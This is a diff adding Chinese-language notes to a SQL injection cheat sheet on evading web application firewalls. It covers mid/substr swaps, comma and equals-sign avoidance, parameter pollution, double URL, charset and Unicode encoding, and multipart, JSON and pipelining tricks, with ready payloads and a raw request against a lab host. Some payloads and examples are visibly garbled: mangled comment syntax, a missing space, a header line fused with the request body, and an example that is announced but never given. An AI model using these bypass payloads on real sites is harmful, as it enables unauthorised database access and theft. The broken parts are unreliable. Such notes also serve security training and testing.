@@ -362,6 +362,144 @@ substr 截取字符串
 select(substr(database() from 1 for 1));   
 注入语句示例：  
 select * from users where id=1 and 's'=(select(substr(database() from 1 for 1)));  
-可以进一步优化 s 换成 hex 0x73 这样就避免了单引号  
+可以进一步优化 s 换成 hex 0x73 这样就避免了单引号   0x73 -> "s" 字符s
 select * from users where id=1 and 0x73=(select(substr(database() from 1 for 1)));  
 
+min 截取字符串  
+这个 min 函数跟 substr 函数功能相同 如果 substr 函数被拦截或者过滤可以使用这个函数代替。  
+select mid(database() from 1 for 1);   
+select * from users where id=1 and 's'=(select(mid(database() from 1 for 1)));  
+select * from users where id=1 and 0x73 =(select(mid(database() from 1 for 1)));  
+
+使用JOIN  
+Join可以将两个表名或者查询结果连接起来，使用方法如下  
+union select 1,2` 等价于 `union select * from (select 1)a join (select 2)b  
+a 和 b 分别是表的别名  
+select * from users where id=-1 union select 1,2,3,4;  
+以上语句可更改成一下形式  
+
+使用like模糊查询  
+使用 like 模糊查询 select user() like '%r%'; 模糊查询成功返回 1 否则返回 0  
+%：匹配零个或多个任意字符  
+_：匹配单个任意字符  
+找到第一个字符后继续进行下一个字符匹配。从而找到正确的用户名，也可以将 user() 替换成 database() ，从而查找库名，这种 SQL 注入语句也不会存在逗号  
+
+需要使用 limit 时的逗号绕过  
+SQL 注入时，如果需要限定条目可以使用 limit 0,1 限定返回条目的数目 limit 0,1 返回条一条记录 如果对逗号进行拦截时，  
+可以使用 limit 1 默认返回第一条数据。也可以使用 limit 1 offset 0 从零开始返回第一条记录，这样就绕过拦截了。  
+
+5 绕过等号过滤  
+如果程序会对=进行拦截 可以使用 like rlike regexp 或者使用<或者>  
+select * from users where id=1 and ascii(substring(user(),1,1))<115;  
+select * from users where id=1 and ascii(substring(user(),1,1))>115;  
+select * from users where id=1 and (select substring(user(),1,1)like 'r%');  
+select * from users where id=1 and (select substring(user(),1,1)rlike 'r');  
+select * from users where id=1 and 1=(select user() regexp '^r');  
+select * from users where id=1 and 1=(select user() regexp '^a');  
+
+6 利用脚本语言特性绕过
+在 php 语言中 id=1&id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过过滤。  
+ id=1%00&id=2 union select 1,2,3  
+有些 waf 回去匹配第一个 id 参数 1%00 %00 是截断字符，waf 会自动截断 从而不会检测后面的内容。到了程序中 id 就是等于 id=2 union select 1,2,3 从绕过注入拦截。  
+
+7 二次编码绕过  
+有些程序会解析二次编码，造成 SQL 注入，因为 url 两次编码过后，waf 是不会拦截的。  
+-1 union select 1,2,3,4#  
+第一次转码  
+%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23  
+第二次转码  
+%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33  
+
+代码里有 urldecode 这个函数是对字符 url 解码，因为两次编码 GPC 是不会过滤的，所以可以绕过 gpc 字符转义，这样也就绕过了 waf 的拦截。  
+
+------
+1 冷门绕过  
+信任白名单绕过  
+有些 WAF 会自带一些文件白名单，对于白名单 waf 不会拦截任何操作，所以可以利用这个特点，可以试试白名单绕过。  
+白名单通常有目录  
+/admin
+
+/phpmyadmin
+
+/admin.php
+
+/sqli/sqli_str.php?a=/admin.php&name=vince+&submit=1
+
+l/sqli/sqli_str.php/phpmyadmin?name=%27%20union%20select%201,user()--+&submit=1
+
+此种情况也要看中间件情况使用，某些中间件对多个参数的梳理不同
+
+pipline绕过注入  
+http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用 burpsuite 截获的数  据），其中包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个 http 包容  量，需要分多次发送时，值会变成 keep-alive，即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止  
+用 burpsuite 抓包提交 复制整个包信息放在第一个包最后，把第一个包 close 改成 keep-alive ，把 brupsuite 自动更新 Content-Length 勾去掉。  
+第一个包参数的字符要加上长度接着提交即可。有些 waf 不会对第一个包的参数进行检测，这样就可以绕过一些 waf 拦截。  
+
+利用 multipart/form-data 绕过  
+在 http 头里的 Content-Type 提交表单支持三种协议  
+application/x-www-form-urlencoded 编码模式 post 提交  
+multipart/form-data 文件上传模式  
+text/plain 文本模式  
+文件头的属性 是传输前对提交的数据进行编码发送到服务器。  
+其中 multipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。  
+Content-Type: multipart/form-data;  
+boundary=---------------------------28566904301101419271642457175  
+boundary 这是用来匹配的值  
+Content-Disposition: form-data; name="id" 这也能作为 post 提交  
+所以程序会接收到构造的 SQL 注入语句-1 union select 1,user()  
+
+利用application/json 或者 text/xml 绕过  
+有些程序是 json 提交参数，程序也是 json 接收再拼接到 SQL 执行 json 格式通常不会被拦截。所以可以绕过 waf   
+运行大量字符绕过   
+可以使用 select 0xA 运行一些字符从绕突破一些 waf 拦截  
+get 编码  
+id=1 and (select 1)=(select0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/!union//!select/1,user()  
+post 编码  
+1+and+select+1)%3d(select+0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/!union//!select/1,user()&submit=1  
+利用花括号绕过  
+select 1,2 union select{x 1},user()  
+花括号 左边是注释的内容（mysql依旧读1）这样可以一些 waf 的拦截  
+
+换行绕过  
+目前很多 waf 都会对 union select 进行过滤的 因为使用联合查询 这两个关键词是必须的，一般过滤这个两个字符 想用联合查询就很难了。  
+可以使用换行 加上一些注释符进行绕过。  
+二次URL编码绕过  
+原理：形式：“%”加上 ASCII 码（先将字符转换为两位 ASCII 码，再转为 16 进制），其中加号“+”在 URL 编码中和“%20”表示一样，均为空格。  
+当遇到非 ASCII 码表示的字符时，如中文，浏览器或通过编写 URLEncode，根据 UTF-8、GBK 等编码 16 进制形式，进行转换。如“春”的 UTF-8 编码为 E6 98 A5，因此其在支持 UTF-8 的情况下，URL 编码为%E6%98%A5。值得注意的是采取不同的中文编码，会有不同的URL 编码。  
+在 URL 传递到后台时，首先 web 容器会自动先对 URL 进行解析。容器解码时，会根据设置（如 jsp 中，会使用 request.setCharacterEncoding("UTF-8")），采用UTF-8 或 GBK 等其中一种编码进行解析。这时，程序无需自己再次解码，便可以获取参数（如使用 request.getParameter(paramName)）。  
+但是，有时从客户端提交的 URL 无法确定是何种编码，如果服务器选择的编码方式不匹配，则会造成中文乱码。为了解决这个问题，便出现了二次 URLEncode的 方 法 。   在 客 户 端 对 URL 进 行 两 次 URLEncode ， 这 样 类 似 上 文 提 到的%E6%98%A5 则会编码为%25e6%2598%25a5，为纯 ASCII 码。Web 容器在接到 URL   后，自动解析一次，因为不管容器使用何种编码进行解析，都支持 ASCII码，不会出错。然后在通过编写程序对容器解析后的参数进行解码，便可正确得到参数。在这里，客户端的第一次编码，以及服务端的第二次解码，均是由程序员自己设定的，是可控的，可知的  
+
+各种编码绕过  
+1 HTTP 数据编码绕过  
+编码绕过在绕 waf 中也是经常遇到的，通常 waf 只坚持他所识别的编码，比如说它只识别 utf-8 的字符，但是服务器可以识别比 utf-8 更多的编码。  
+那么我们只需要将 payload 按照 waf 识别不了但是服务器可以解析识别的编码格式即可绕过。  
+比如请求包中我们可以更改Content-Type中的charset的参数值，我们改为ibm037这个协议编码，有些服务器是支持的。payload 改成这个协议格式就行了。  
+POST /06/vul/sqli/sqli_id.php HTTP/1.1  
+Host: 192.168.0.115  
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101  
+Firefox/88.0  
+Accept:  
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8  
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
+Accept-Encoding: gzip, deflate  
+Content-Type: application/x-www-form-urlencoded;charset:ibm037  
+Content-Length: 33  
+Connection: close  
+Cookie: PHPSESSID=e6sa76lft65q3fd25bilbc49v3; security_level=0  
+Upgrade-Insecure-Requests: 1%89%84=%F1&%A2%A4%82%94%89%A3=%F1  
+
+2 url 编码绕过  
+在 iis 里会自动把 url 编码转换成字符串传到程序中执行。  
+例如 union select 可以转换成 u%6eion s%65lect  
+
+Unicode 编码绕过  
+形式：“\u”或者是“%u”加上 4 位 16 进制 Unicode 码值。  
+iis 会自动进行识别这种编码 有部分 waf 并不会拦截这这种编码  
+-1 union select 1,user()  
+部分转码  
+-1 uni%u006fn sel%u0065ct 1,user()  
+全部转码  
+%u002d%u0031%u0020%u0075%u006e%u0069%u006f%u006e%u0020%u0073%u  
+0065%u006c%u0065%u0063%u0074%u0020%u0031%u002c%u0075%u0073%u00
+65%u0072%u0028%u0029
+
+-----
